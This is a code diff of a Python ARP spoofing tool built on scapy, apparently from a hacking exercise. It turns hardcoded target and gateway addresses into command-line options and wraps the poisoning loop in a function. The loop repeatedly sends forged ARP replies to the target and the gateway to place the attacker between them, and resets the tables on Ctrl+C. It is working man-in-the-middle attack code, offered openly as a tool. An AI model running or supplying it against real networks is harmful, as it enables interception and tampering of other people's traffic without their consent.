@@ -3,6 +3,7 @@
 import scapy.all as scapy
 import time
 import sys
+import argparse
 
 
 def get_mac_address(ip_address):
@@ -32,19 +33,37 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
-target_ip = "192.168.1.188"
-gateway_ip = "192.168.1.1"
-sent_packets_count = 0
-try:
-    while True:
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
-        sent_packets_count = sent_packets_count + 2
-        print("\r[+] Packets sent: " +
-              str(sent_packets_count), end="")
-        sys.stdout.flush()
-        time.sleep(2)
-except KeyboardInterrupt:
-    print("\n[-] Detected CTRL + C... Resetting ARP tables")
-    restore(target_ip, gateway_ip)
-    restore(gateway_ip, target_ip)
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target",
+                        help="Target IP address to be spoofed")
+    parser.add_argument("-g", "--gateway", dest="gateway",
+                        help="Gateway IP address to be spoofed")
+    options = parser.parse_args()
+    # Check for empty fields
+    if not options.target:
+        parser.error(
+            "[-] Please specify a target IP address and gateway IP to spoof, use --help for more info")
+    else:
+        return options
+
+
+def run_spoof(target_ip, gateway_ip):
+    sent_packets_count = 0
+    try:
+        while True:
+            spoof(target_ip, gateway_ip)
+            spoof(gateway_ip, target_ip)
+            sent_packets_count = sent_packets_count + 2
+            print("\r[+] Packets sent: " +
+                  str(sent_packets_count), end="")
+            sys.stdout.flush()
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n[-] Detected CTRL + C... Resetting ARP tables")
+        restore(target_ip, gateway_ip)
+        restore(gateway_ip, target_ip)
+
+
+option = get_arguments()
+result = run_spoof(option.target, option.gateway)
